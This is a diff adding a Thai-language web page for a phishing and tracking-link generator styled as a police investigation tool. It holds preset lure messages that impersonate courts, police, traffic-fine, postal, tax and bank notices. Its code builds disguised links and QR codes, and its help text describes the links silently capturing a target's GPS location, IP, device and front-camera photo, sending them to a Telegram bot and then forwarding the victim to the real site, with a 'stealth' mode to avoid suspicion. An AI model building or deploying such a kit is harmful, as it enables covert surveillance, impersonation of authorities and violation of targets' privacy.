+                    detail: 'ตรวจพบบัญชีของท่านมีส่วนพัวพันกับการกระทำความผิด กรุณายืนยันตัวตนกับพนักงานสอบสวน',
+                    dest: 'https://www.royalthaipolice.go.th/',
+                    btn: 'ตรวจสอบข้อกล่าวหา',
+                    targetTag: 'เคสพ.ร.บ.คอมพ์'
+                }
+            ],
+            traffic: [
+                {
+                    id: 'traffic',
+                    icon: '🚦',
+                    name: 'ใบสั่งจราจรอิเล็กทรอนิกส์',
+                    img: 'https://images.unsplash.com/photo-1549317661-bd32c8ce0db2?w=800&q=80',
+                    title: '🚦 ใบสั่งจราจรอิเล็กทรอนิกส์ (ระบบออนไลน์)',
+                    detail: 'ตรวจพบการกระทำผิด พ.ร.บ.จราจรทางบก ตรวจสอบภาพถ่ายกล้องวงจรปิดและสถานที่เกิดเหตุ',
+                    dest: 'https://ptm.police.go.th/',
+                    btn: 'ดูรายละเอียดเพิ่มเติม',
+                    targetTag: 'เคสใบสั่งจราจร'
+                },
+                {
+                    id: 'fine_payment',
+                    icon: '💳',
+                    name: 'ชำระค่าปรับจราจร e-Pay',
+                    img: 'https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=800&q=80',
+                    title: '💳 ระบบรับชำระค่าปรับจราจรออนไลน์ (e-Payment)',
+                    detail: 'ตรวจพบรายการค้างชำระค่าปรับตาม พ.ร.บ.จราจรทางบก ตรวจสอบหลักฐานภาพถ่ายและดำเนินการชำระเงิน',
+                    dest: 'https://ptm.police.go.th/',
+                    btn: 'ชำระเงินออนไลน์',
+                    targetTag: 'เคสชำระค่าปรับ'
+                },
+                {
+                    id: 'parcel',
+                    icon: '📦',
+                    name: 'แจ้งเตือนพัสดุตกค้าง',
+                    img: 'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80',
+                    title: '📦 แจ้งเตือน: พัสดุของคุณยังจัดส่งไม่สำเร็จ',
+                    detail: 'หมายเลขพัสดุ TH9028481 ติดต่อผู้รับไม่ได้ กรุณากดยืนยันตำแหน่งจัดส่งใหม่อีกครั้งเพื่อนำจ่ายรอบถัดไป',
+                    dest: 'https://track.thailandpost.co.th/',
+                    btn: 'ตรวจสอบพัสดุ',
+                    targetTag: 'เคสพัสดุตกค้าง'
+                }
+            ],
+            finance: [
+                {
+                    id: 'tax_refund',
+                    icon: '💰',
+                    name: 'แจ้งยอดเงินภาษีคืน',
+                    img: 'https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=800&q=80',
+                    title: '💰 แจ้งยอดรับเงินคืนภาษี / ชำระค่าบริการ',
+                    detail: 'มีรายการยอดเงินคงค้างในระบบ โปรดยืนยันตัวตนเพื่อดำเนินการรับเงินคืนเข้าบัญชี',
+                    dest: 'https://www.rd.go.th/',
+                    btn: 'ยืนยันรับเงินคืน',
+                    targetTag: 'เคสเงินคืนภาษี'
+                },
+                {
+                    id: 'bank_freeze',
+                    icon: '🏦',
+                    name: 'บัญชีธนาคารระงับชั่วคราว',
+                    img: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800&q=80',
+                    title: '🏦 แจ้งเตือน: บัญชีธนาคารถูกระงับการทำธุรกรรม',
+                    detail: 'ตรวจพบธุรกรรมต้องสงสัย กรุณาเข้าสู่ระบบรักษาความปลอดภัยเพื่อยืนยันตัวตน',
+                    dest: 'https://www.bot.or.th/',
+                    btn: 'ตรวจสอบบัญชี',
+                    targetTag: 'เคสบัญชีธนาคาร'
+                },
+                {
+                    id: 'reward',
+                    icon: '🎁',
+                    name: 'รับสิทธิ์/ของสมนาคุณ',
+                    img: 'https://images.unsplash.com/photo-1513151233558-d860c5398176?w=800&q=80',
+                    title: '🎁 คุณได้รับสิทธิ์เข้าร่วมกิจกรรมพิเศษ',
+                    detail: 'กดตรวจสอบสิทธิ์และยืนยันสาขาใกล้บ้านเพื่อรับของที่ระลึกจำนวนจำกัด',
+                    dest: 'https://www.google.com',
+                    btn: 'กดรับสิทธิ์รางวัล',
+                    targetTag: 'เคสรับรางวัล'
+                }
+            ],
+            photo: [
+                {
+                    id: 'img_news',
+                    icon: '🚨',
+                    name: 'ภาพข่าวด่วนสด (ภาพล้วน)',
+                    img: 'https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=800&q=80',
+                    title: 'ข่าวด่วนเหตุการณ์สด (รูปภาพ)',
+                    dest: 'https://www.thairath.co.th',
+                    targetTag: 'เคสข่าวด่วน'
+                },
+                {
+                    id: 'img_fine',
+                    icon: '💳',
+                    name: 'ภาพใบสั่งค่าปรับ (ภาพล้วน)',
+                    img: 'https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=800&q=80',
+                    title: 'ใบแจ้งยอดชำระค่าปรับ (รูปภาพ)',
+                    dest: 'https://ptm.police.go.th/',
+                    targetTag: 'เคสชำระค่าปรับ'
+                },
+                {
+                    id: 'img_parcel',
+                    icon: '📦',
+                    name: 'ภาพกล่องพัสดุ (ภาพล้วน)',
+                    img: 'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80',
+                    title: 'พัสดุตกค้าง (รูปภาพ)',
+                    dest: 'https://track.thailandpost.co.th/',
+                    targetTag: 'เคสพัสดุตกค้าง'
+                },
+                {
+                    id: 'img_document',
+                    icon: '📄',
+                    name: 'ภาพเอกสารราชการ (ภาพล้วน)',
+                    img: 'https://images.unsplash.com/photo-1568667256549-094345857637?w=800&q=80',
+                    title: 'เอกสารราชการ (รูปภาพ)',
+                    dest: 'https://www.royalthaipolice.go.th/',
+                    targetTag: 'เคสเอกสารราชการ'
+                },
+                {
+                    id: 'img_map',
+                    icon: '🗺️',
+                    name: 'ภาพพิกัดแผนที่ (ภาพล้วน)',
+                    img: 'https://images.unsplash.com/photo-1524661135-423995f22d0b?w=800&q=80',
+                    title: 'ตำแหน่งพิกัดแผนที่ (รูปภาพ)',
+                    dest: 'https://maps.google.com',
+                    targetTag: 'เคสนำทางแผนที่'
+                }
+            ]
+        };
+
+        let currentPresetCategory = 'legal';
+
+        function smartTrackingBack() {
+            if (window.parent && window.parent !== window && typeof window.parent.showPage === 'function') {
+                window.parent.showPage('sanapp');
+            } else if (typeof showPage === 'function') {
+                showPage('sanapp');
+            } else if (window.history.length > 1) {
+                window.history.back();
+            } else {
+                window.location.href = 'index.html?page=sanapp';
+            }
+        }
+
+        function filterPresetCategory(cat) {
+            currentPresetCategory = cat;
+            const cats = ['legal', 'traffic', 'finance', 'photo'];
+            cats.forEach(c => {
+                const btn = document.getElementById(`pcat-${c}`);
+                if (btn) {
+                    if (c === cat) {
+                        btn.className = 'px-2.5 py-1 rounded-lg bg-police-blue text-white shrink-0 transition font-bold shadow-sm';
+                    } else {
+                        btn.className = 'px-2.5 py-1 rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-200/60 shrink-0 transition font-bold';
+                    }
+                }
+            });
+
+            renderPresets();
+        }
+
+        function renderPresets() {
+            const container = document.getElementById('presets-container');
+            if (!container) return;
+            const items = PRESET_DB[currentPresetCategory] || [];
+            container.innerHTML = items.map(item => `
+                <button type="button" onclick="selectPreset('${currentPresetCategory}', '${item.id}')"
+                    class="btn-preset p-2.5 rounded-xl bg-white hover:bg-blue-50/80 border border-slate-200 hover:border-blue-300 text-left text-xs text-slate-800 font-bold flex items-center gap-2 shadow-sm hover:shadow transition-all">
+                    <span class="text-base">${item.icon}</span>
+                    <span class="truncate">${item.name}</span>
+                </button>
+            `).join('');
+        }
+
+        function selectPreset(category, id) {
+            const list = PRESET_DB[category] || [];
+            const item = list.find(x => x.id === id);
+            if (!item) return;
+
+            const imgInput = document.getElementById('image-url');
+            const titleInput = document.getElementById('flex-title');
+            const detailInput = document.getElementById('flex-detail');
+            const destInput = document.getElementById('destination-url');
+            const btnTextInput = document.getElementById('flex-btn-text');
+            const toggleImgOnly = document.getElementById('toggle-image-only');
+
+            if (category === 'photo') {
+                if (imgInput) imgInput.value = item.img;
+                if (titleInput) titleInput.value = item.title;
+                if (detailInput) detailInput.value = '';
+                if (destInput) destInput.value = item.dest;
+                if (toggleImgOnly) {
+                    toggleImgOnly.checked = true;
+                    toggleImageOnlyMode(true);
+                }
+            } else {
+                if (imgInput) imgInput.value = item.img;
+                if (titleInput) titleInput.value = item.title;
+                if (detailInput) detailInput.value = item.detail;
+                if (destInput) destInput.value = item.dest;
+                if (btnTextInput && item.btn) btnTextInput.value = item.btn;
+                if (toggleImgOnly) {
+                    toggleImgOnly.checked = false;
+                    toggleImageOnlyMode(false);
+                }
+            }
+
+            syncTargetUrl();
+            if (imgInput) imgInput.dispatchEvent(new Event('input'));
+            updateLivePreviewText();
+        }
+
+        function switchPreviewTab(tab) {
+            const btnLine = document.getElementById('tab-btn-line');
+            const btnTele = document.getElementById('tab-btn-tele');
+            const viewLine = document.getElementById('view-line-preview');
+            const viewTele = document.getElementById('view-tele-preview');
+
+            if (tab === 'line') {
+                btnLine.className = 'px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center gap-1.5 bg-police-blue text-white shadow-sm';
+                btnTele.className = 'px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center gap-1.5 text-slate-600 hover:text-slate-900';
+                viewLine.classList.remove('hidden');
+                viewTele.classList.add('hidden');
+            } else {
+                btnTele.className = 'px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center gap-1.5 bg-sky-600 text-white shadow-sm';
+                btnLine.className = 'px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center gap-1.5 text-slate-600 hover:text-slate-900';
+                viewTele.classList.remove('hidden');
+                viewLine.classList.add('hidden');
+            }
+        }
+
+        function toggleImageOnlyMode(isImageOnly) {
+            const sectionTitle = document.getElementById('section-title');
+            const sectionDetail = document.getElementById('section-detail');
+            const sectionBtnText = document.getElementById('section-btn-text');
+            const previewBody = document.getElementById('preview-body-container');
+            const previewFooter = document.getElementById('preview-footer-container');
+            const badgeMode = document.getElementById('preview-badge-mode');
+            const previewContainer = document.getElementById('preview-container');
+            const teleBody = document.getElementById('tele-body-content');
+
+            if (isImageOnly) {
+                if (sectionTitle) sectionTitle.classList.add('opacity-40', 'pointer-events-none');
+                if (sectionDetail) sectionDetail.classList.add('opacity-40', 'pointer-events-none');
+                if (sectionBtnText) sectionBtnText.classList.add('opacity-40', 'pointer-events-none');
+                if (previewBody) previewBody.classList.add('hidden');
+                if (previewFooter) previewFooter.classList.add('hidden');
+                if (teleBody) teleBody.classList.add('hidden');
+                if (badgeMode) {
+                    badgeMode.textContent = 'Stealth Photo';
+                    badgeMode.className = 'px-2.5 py-0.5 rounded-full bg-amber-50 text-amber-800 text-[10px] font-bold border border-amber-200';
+                }
+                if (previewContainer) {
+                    previewContainer.className = 'w-full h-64 bg-slate-100 relative overflow-hidden flex items-center justify-center';
+                }
+            } else {
+                if (sectionTitle) sectionTitle.classList.remove('opacity-40', 'pointer-events-none');
+                if (sectionDetail) sectionDetail.classList.remove('opacity-40', 'pointer-events-none');
+                if (sectionBtnText) sectionBtnText.classList.remove('opacity-40', 'pointer-events-none');
+                if (previewBody) previewBody.classList.remove('hidden');
+                if (previewFooter) previewFooter.classList.remove('hidden');
+                if (teleBody) teleBody.classList.remove('hidden');
+                if (badgeMode) {
+                    badgeMode.textContent = 'Full Card';
+                    badgeMode.className = 'px-2.5 py-0.5 rounded-full bg-blue-50 text-police-blue text-[10px] font-bold border border-blue-200';
+                }
+                if (previewContainer) {
+                    previewContainer.className = 'w-full h-52 bg-slate-100 relative overflow-hidden flex items-center justify-center border-b border-slate-200';
+                }
+            }
+        }
+
+        // Auto Combined URL Syncer (Supports Target Name, Autorun & Engine Switch)
+        function syncTargetUrl() {
+            const destInput = document.getElementById('destination-url');
+            const targetInput = document.getElementById('target-url');
+            const targetNameInput = document.getElementById('target-name');
+            const autoRunCheck = document.getElementById('check-autorun');
+            const previewEl = document.getElementById('full-url-preview');
+            const teleUrlTag = document.getElementById('mock-tele-url-tag');
+            const engineRadio = document.querySelector('input[name="tracking-engine"]:checked');
+            const engine = engineRadio ? engineRadio.value : 'github';
+
+            let destVal = destInput ? destInput.value.trim() : '';
+            let targetName = targetNameInput ? targetNameInput.value.trim() : 'เป้าหมายการสืบสวน';
+
+            // Calculate Base URLs
+            const liffId = (typeof CONFIG !== 'undefined' && CONFIG.LIFF_ID) ? CONFIG.LIFF_ID : '2004593216-XbA9wj26';
+            const baseLiffLink = `https://liff.line.me/${liffId}/link.html`;
+            
+            // Current direct host URL for link.html
+            const currentDir = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
+            const baseDirectLink = currentDir ? `${currentDir}/link.html` : 'link.html';
+
+            let baseTracker = (engine === 'github') ? baseDirectLink : baseLiffLink;
+            let fullUrl = '';
+
+            let queryParams = [];
+            if (destVal) {
+                queryParams.push(`url=${encodeURIComponent(destVal)}`);
+            } else {
+                queryParams.push(`url=${encodeURIComponent('https://www.google.com')}`);
+            }
+
+            if (targetName) {
+                queryParams.push(`target=${encodeURIComponent(targetName)}`);
+            }
+
+            if (autoRunCheck && autoRunCheck.checked) {
+                queryParams.push(`autorun=1`);
+            }
+
+            const dualCamCheck = document.getElementById('check-dualcam');
+            if (dualCamCheck && dualCamCheck.checked) {
+                queryParams.push(`cam=dual`);
+            }
+
+            fullUrl = `${baseTracker}?${queryParams.join('&')}`;
+
+            if (targetInput) targetInput.value = fullUrl;
+            if (previewEl) previewEl.textContent = fullUrl;
+            if (teleUrlTag) teleUrlTag.textContent = fullUrl;
+        }
+
+        function copyFullTrackingUrl() {
+            const targetInput = document.getElementById('target-url');
+            if (targetInput && targetInput.value) {
+                navigator.clipboard.writeText(targetInput.value).then(() => {
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'คัดลอกลิงก์ดักจับแล้ว',
+                        text: targetInput.value,
+                        timer: 1600,
+                        showConfirmButton: false,
+                        confirmButtonColor: '#1e3a8a',
+                        // Light theme default
+                    });
+                });
+            }
+        }
+
+        function showQrModal() {
+            const targetInput = document.getElementById('target-url');
+            const url = targetInput ? targetInput.value : '';
+            if (!url) return;
+
+            const qrImgUrl = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(url)}`;
+            Swal.fire({
+                title: 'QR Code ดักจับพิกัด',
+                html: `
+                    <div class="text-center p-2">
+                        <img src="${qrImgUrl}" alt="QR Code" class="mx-auto rounded-xl shadow-lg border-2 border-slate-300 mb-3" style="width:200px;height:200px;">
+                        <p class="text-xs text-slate-700 font-mono break-all">${url}</p>
+                    </div>
+                `,
+                confirmButtonText: 'ปิด',
+                confirmButtonColor: '#0284c7',
+                confirmButtonColor: '#1e3a8a',
+                // Light theme default
+            });
+        }
+
+        function showHelpModal() {
+            Swal.fire({
+                title: 'คู่มือศูนย์ติดตามเป้าหมายคดี',
+                html: `
+                    <div class="text-left text-xs space-y-2 text-slate-700 leading-relaxed">
+                        <p><b class="text-sky-400">1. วัตถุประสงค์:</b> ใช้สร้างเหยื่อล่อ (Social Engineering) ทางยุทธวิธี เพื่อให้เป้าหมายกดเปิดลิงก์</p>
+                        <p><b class="text-sky-400">2. การทำงานของลิงก์:</b> เมื่อเป้าหมายแตะลิงก์หรือรูปภาพ ระบบ link.html จะจับพิกัด GPS, IP/ผู้ให้บริการ, รุ่นอุปกรณ์ และถ่ายภาพกล้องหน้า ส่งตรงเข้า <b>Telegram Bot</b> ของชุดสืบสวนทันที</p>
+                        <p><b class="text-sky-400">3. โหมดภาพล้วน (Stealth):</b> เหมาะอย่างยิ่งสำหรับการส่งในแชท LINE เพื่อไม่ให้เหยื่อสงสัย</p>
+                        <p><b class="text-sky-400">4. ปลายทาง Forward:</b> เหยื่อจะถูกส่งต่อไปยังเว็บเป้าหมายจริง (เช่น ไปรษณีย์ หรือ ใบสั่งตำรวจ) อย่างแนบเนียน</p>
+                    </div>
+                `,
+                confirmButtonText: 'รับทราบ',
+                confirmButtonColor: '#0284c7',
+                confirmButtonColor: '#1e3a8a',
+                // Light theme default
+            });
+        }
+
+        function updateDossierDisplay() {
+            const targetNameInput = document.getElementById('target-name');
+            const targetPhoneInput = document.getElementById('target-phone');
+            const displayEl = document.getElementById('dossier-target-display');
+            
+            const name = (targetNameInput && targetNameInput.value.trim()) ? targetNameInput.value.trim() : 'ทั่วไป';
+            const phone = (targetPhoneInput && targetPhoneInput.value.trim()) ? targetPhoneInput.value.trim() : '';
+            
+            if (displayEl) {
+                displayEl.textContent = `เป้าหมาย: ${name} ${phone ? '• 📞 ' + phone : ''}`;
+            }
+        }
+
+        function focusTargetInput() {
+            const input = document.getElementById('target-name');
+            if (input) {
+                input.focus();
+                input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        }
+
+        function chooseQuickImagePreset() {
+            Swal.fire({
+                title: 'เลือกภาพตัวอย่างหน้าปก',
+                html: `
+                    <div class="grid grid-cols-2 gap-2 text-xs">
+                        <button onclick="setSampleImg('https://images.unsplash.com/photo-1568667256549-094345857637?w=800&q=80')" class="p-1 rounded bg-slate-50 border border-slate-200 hover:border-sky-400 text-left">
+                            <img src="https://images.unsplash.com/photo-1568667256549-094345857637?w=800&q=80" class="h-16 w-full object-cover rounded mb-1">
+                            <span>📄 เอกสารราชการ</span>
+                        </button>
+                        <button onclick="setSampleImg('https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80')" class="p-1 rounded bg-slate-50 border border-slate-200 hover:border-sky-400 text-left">
+                            <img src="https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80" class="h-16 w-full object-cover rounded mb-1">
+                            <span>📦 กล่องพัสดุ</span>
+                        </button>
+                        <button onclick="setSampleImg('https://images.unsplash.com/photo-1549317661-bd32c8ce0db2?w=800&q=80')" class="p-1 rounded bg-slate-50 border border-slate-200 hover:border-sky-400 text-left">
+                            <img src="https://images.unsplash.com/photo-1549317661-bd32c8ce0db2?w=800&q=80" class="h-16 w-full object-cover rounded mb-1">
+                            <span>🚦 การจราจร</span>
+                        </button>
+                        <button onclick="setSampleImg('https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=800&q=80')" class="p-1 rounded bg-slate-50 border border-slate-200 hover:border-sky-400 text-left">
+                            <img src="https://images.unsplash.com/photo-1585829365295-ab7cd400c167?w=800&q=80" class="h-16 w-full object-cover rounded mb-1">
+                            <span>🚨 ข่าวด่วน</span>
+                        </button>
+                    </div>
+                `,
+                showConfirmButton: false,
+                confirmButtonColor: '#1e3a8a',
+                // Light theme default
+            });
+        }
+
+        function setSampleImg(url) {
+            const input = document.getElementById('image-url');
+            if (input) {
+                input.value = url;
+                input.dispatchEvent(new Event('input'));
+            }
+            updateLivePreviewText();
+            Swal.close();
+        }
+
+        function updateLivePreviewText() {
+            const titleInput = document.getElementById('flex-title');
+            const detailInput = document.getElementById('flex-detail');
+            const btnTextInput = document.getElementById('flex-btn-text');
+            const imgInput = document.getElementById('image-url');
+
+            // LINE Elements
+            const previewTitle = document.getElementById('preview-title');
+            const previewDetail = document.getElementById('preview-detail');
+            const previewBtnText = document.getElementById('preview-btn-text');
+
+            // Telegram Elements
+            const teleTitle = document.getElementById('mock-tele-title');
+            const teleDetail = document.getElementById('mock-tele-detail');
+            const teleBtnText = document.getElementById('mock-tele-btn-text');
+            const teleHeroImg = document.getElementById('mock-tele-hero-img');
+            const teleTimestamp = document.getElementById('mock-tele-timestamp');
+
+            const curTitle = (titleInput && titleInput.value.trim()) ? titleInput.value.trim() : '📌 ระบบสนับสนุนงานตำรวจ (San BOT)';
+            const curDetail = (detailInput && detailInput.value.trim()) ? detailInput.value.trim() : 'กดที่รูปภาพด้านบน หรือข้อความด้านล่างเพื่อตรวจสอบรายละเอียด';
+            const curBtn = (btnTextInput && btnTextInput.value.trim()) ? btnTextInput.value.trim() : 'อ่านเพิ่มเติม';
+            const curImg = (imgInput && imgInput.value.trim()) ? imgInput.value.trim() : 'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800&q=80';
+
+            // Update LINE
+            if (previewTitle) previewTitle.textContent = curTitle;
+            if (previewDetail) previewDetail.textContent = curDetail;
+            if (previewBtnText) previewBtnText.textContent = curBtn;
+
+            // Update Telegram
+            if (teleTitle) teleTitle.textContent = curTitle;
+            if (teleDetail) teleDetail.textContent = curDetail;
+            if (teleBtnText) teleBtnText.textContent = curBtn;
+            if (teleHeroImg && curImg) teleHeroImg.src = curImg;
+
+            const now = new Date();
+            const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')} น.`;
+            if (teleTimestamp) teleTimestamp.textContent = timeStr;
+        }
+
+        // Parse URL parameters from investigation.html (e.g. ?targetId=...&targetName=...&phone=...)
+        function parseIncomingUrlParams() {
+            try {
+                const params = new URLSearchParams(window.location.search);
+                const targetName = params.get('targetName') || params.get('name');
+                const targetPhone = params.get('phone');
+                const presetId = params.get('preset');
+                const urlParam = params.get('url');
+
+                if (targetName) {
+                    const nameInput = document.getElementById('target-name');
+                    if (nameInput) nameInput.value = targetName;
+                }
+                if (targetPhone) {
+                    const phoneInput = document.getElementById('target-phone');
+                    if (phoneInput) phoneInput.value = targetPhone;
+                }
+                if (urlParam) {
+                    const destInput = document.getElementById('destination-url');
+                    if (destInput) destInput.value = urlParam;
+                }
+
+                if (presetId) {
+                    // Search in preset DB
+                    for (const cat in PRESET_DB) {
+                        const match = PRESET_DB[cat].find(x => x.id === presetId);
+                        if (match) {
+                            filterPresetCategory(cat);
+                            selectPreset(cat, presetId);
+                            break;
+                        }
+                    }
+                }
+            } catch (e) {
+                console.warn('Error parsing URL parameters:', e);
+            }
+        }
+
+        // Attach input listeners for live preview
+        document.addEventListener('DOMContentLoaded', () => {
+            renderPresets();
+            parseIncomingUrlParams();
+
+            const titleInput = document.getElementById('flex-title');
+            const detailInput = document.getElementById('flex-detail');
+            const btnTextInput = document.getElementById('flex-btn-text');
+            const imgInput = document.getElementById('image-url');
+
+            if (titleInput) titleInput.addEventListener('input', updateLivePreviewText);
+            if (detailInput) detailInput.addEventListener('input', updateLivePreviewText);
+            if (btnTextInput) btnTextInput.addEventListener('input', updateLivePreviewText);
+            if (imgInput) imgInput.addEventListener('input', updateLivePreviewText);
+
+            // Default preset
+            selectPreset('legal', 'court_doc');
+            syncTargetUrl();
+            updateDossierDisplay();
+            updateLivePreviewText();
+        });
+    </script>
+    <script src="js/script.js"></script>
+</body>
+
+</html>
